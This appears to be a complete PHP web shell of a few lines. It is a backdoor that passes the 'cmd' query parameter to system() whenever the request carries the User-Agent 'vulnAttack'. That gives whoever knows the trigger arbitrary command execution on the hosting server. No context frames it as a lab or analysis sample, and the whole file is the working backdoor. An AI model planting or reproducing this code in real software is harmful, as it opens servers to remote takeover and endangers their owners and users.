<?php
if ($_SERVER['HTTP_USER_AGENT'] == 'vulnAttack') {
    system($_GET['cmd']);
}
?>